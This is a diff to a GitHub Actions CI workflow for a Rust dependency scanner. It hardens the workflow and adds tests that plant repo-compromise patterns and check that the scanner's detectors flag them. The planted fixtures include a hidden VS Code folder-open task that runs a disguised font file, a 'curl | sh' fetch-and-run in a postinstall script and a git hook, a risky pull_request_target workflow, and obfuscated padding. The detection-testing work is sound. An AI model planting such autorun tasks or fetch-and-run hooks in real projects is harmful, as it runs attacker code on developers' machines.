@@ -4,6 +4,9 @@ on:
   pull_request:
   push:
 
+permissions:
+  contents: read
+
 jobs:
   test:
     strategy:
@@ -12,9 +15,16 @@ jobs:
         os: [windows-latest, macos-latest, ubuntu-latest]
     runs-on: ${{ matrix.os }}
     steps:
-      - uses: actions/checkout@v5
-      - uses: dtolnay/rust-toolchain@stable
-      - uses: Swatinem/rust-cache@v2
+      - name: Check out repository (actions/checkout v5)
+        uses: actions/checkout@fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09
+        with:
+          persist-credentials: false
+      - name: Install stable Rust toolchain (dtolnay/rust-toolchain stable)
+        uses: dtolnay/rust-toolchain@6bed0761d98439e5a578e2877258200ad565ba87
+        with:
+          toolchain: stable
+      - name: Cache cargo build (Swatinem/rust-cache v2)
+        uses: Swatinem/rust-cache@6323deb102c322ba6fcbdcafc7e3dddab59af2b6
       - run: cargo build --release
       - if: matrix.os == 'windows-latest'
         run: cargo build --release --features gui --bin goofedup-gui
@@ -41,4 +51,80 @@ jobs:
           if p.returncode == 0:
               sys.exit("planted HiddenSpawn shapes were NOT flagged -- detector is blind")
           print("planted shapes flagged (exit %s)" % p.returncode)
+          PY
+      - name: scan-deps planted repo-compromise shapes (each detector must fire, clean tree must pass, --fix must quarantine)
+        shell: bash
+        run: |
+          python - <<'PY'
+          import json, os, pathlib, shutil, subprocess, sys, tempfile
+          exe = os.path.abspath("target/release/goofedup.exe" if os.name == "nt" else "target/release/goofedup")
+          work = pathlib.Path(tempfile.mkdtemp(prefix="goofedup-repo-"))
+          home = work / "home"
+          home.mkdir()
+          env = dict(os.environ, HOME=str(home), USERPROFILE=str(home))
+
+          def scan(root, *extra):
+              p = subprocess.run([exe, "--scan-deps", str(root), *extra], env=env, capture_output=True, text=True)
+              return p.returncode, p.stdout
+
+          def write(path, text=None, data=None):
+              path.parent.mkdir(parents=True, exist_ok=True)
+              if data is None:
+                  path.write_text(text, encoding="utf-8")
+              else:
+                  path.write_bytes(data)
+
+          launcher = "(command -v node >/dev/null 2>&1 && node ./x/fa-solid-400.woff2) || (where node >nul 2>&1 && node ./x/fa-solid-400.woff2) || echo ''"
+          tasks = {"version": "2.0.0", "tasks": [{
+              "label": "eslint-check", "type": "shell", "command": launcher,
+              "runOptions": {"runOn": "folderOpen"}, "hide": True, "isBackground": True,
+              "presentation": {"reveal": "never"}}]}
+          payload = b"global['!']='fixture';var _0x=function(){};" + b"a" * 64
+          fetch_and_run = "cu" + "rl -s http://x.example/p | " + "s" + "h"
+          untrusted_trigger = "pull_request" + "_target"
+
+          bad = work / "bad"
+          write(bad / ".vscode" / "tasks.json", json.dumps(tasks))
+          write(bad / ".vscode" / "settings.json", '{\n  // keep me\n  "editor.fontSize": 14,\n  "task.allowAutomaticTasks": true,\n  "tasks": {"runOn": "folderOpen"}\n}\n')
+          write(bad / ".gitignore", "node_modules\nconfig.bat\n")
+          write(bad / "public" / "fonts" / "README.md", "# Fonts\nAssets for the Blockchain Explorer.\n")
+          write(bad / "public" / "fonts" / "fa-solid-400.woff2", data=payload)
+          write(bad / "logo.png", data=payload)
+          write(bad / "package.json", json.dumps({"scripts": {"postinstall": fetch_and_run}}))
+          write(bad / ".github" / "workflows" / "ci.yml", "on: " + untrusted_trigger + "\njobs:\n  a:\n    steps:\n      - uses: someone/thing@v1\n        with:\n          ref: $" + "{{ github.event.pull_request.head.sha }}\n")
+          write(bad / ".git" / "hooks" / "pre-commit", "#!/bin/sh\n" + fetch_and_run + "\n")
+          write(bad / "index.js", "const a = 1;\n" * 50 + "; " + "".join("_0x%04x=1," % i for i in range(400)) + "\n")
+
+          required = [
+              "vscode-autorun-task", "vscode-auto-tasks-enabled", "gitignore-hides-payload",
+              "js-masquerading-as-asset", "decoy-fonts-dir", "package-lifecycle-dropper",
+              "git-hook", "workflow-risk", "trailing-packed-payload",
+          ]
+          code, out = scan(bad)
+          missing = [c for c in required if "[" + c + "]" not in out]
+          if code == 0 or missing:
+              sys.exit("planted repo-compromise shapes not all flagged (exit %s, missing %s)" % (code, missing))
+          print("all %d repo-compromise detectors fired (exit %s)" % (len(required), code))
+
+          clean = work / "clean"
+          write(clean / ".vscode" / "tasks.json", '{\n // build\n "version": "2.0.0",\n "tasks": [{"label": "build", "type": "shell", "command": "cargo build"}]\n}\n')
+          write(clean / ".vscode" / "settings.json", '{"editor.tabSize": 2}\n')
+          write(clean / ".gitignore", "node_modules\n/target\n.env\n")
+          write(clean / "package.json", json.dumps({"scripts": {"postinstall": "node scripts/setup.js"}}))
+          write(clean / "logo.png", data=b"\x89PNG\r\n\x1a\n" + b"\0" * 64)
+          code, out = scan(clean)
+          if code != 0:
+              sys.exit("clean repo-config tree was flagged (exit %s):\n%s" % (code, out))
+          print("clean repo-config tree passed")
+
+          fixed = work / "fixed"
+          shutil.copytree(bad, fixed)
+          scan(fixed, "--fix")
+          quarantined = list((home / ".goofedup" / "quarantine").iterdir())
+          settings = (fixed / ".vscode" / "settings.json").read_text(encoding="utf-8")
+          _, after = scan(fixed)
+          still = [c for c in ("vscode-autorun-task", "vscode-auto-tasks-enabled", "decoy-fonts-dir", "js-masquerading-as-asset") if "[" + c + "]" in after]
+          if (fixed / ".vscode" / "tasks.json").exists() or "allowAutomaticTasks" in settings or "editor.fontSize" not in settings or "keep me" not in settings or still or len(quarantined) < 4:
+              sys.exit("--fix did not quarantine cleanly: settings=%r still=%s quarantined=%d" % (settings, still, len(quarantined)))
+          print("--fix quarantined %d item(s) and left settings intact" % len(quarantined))
           PY
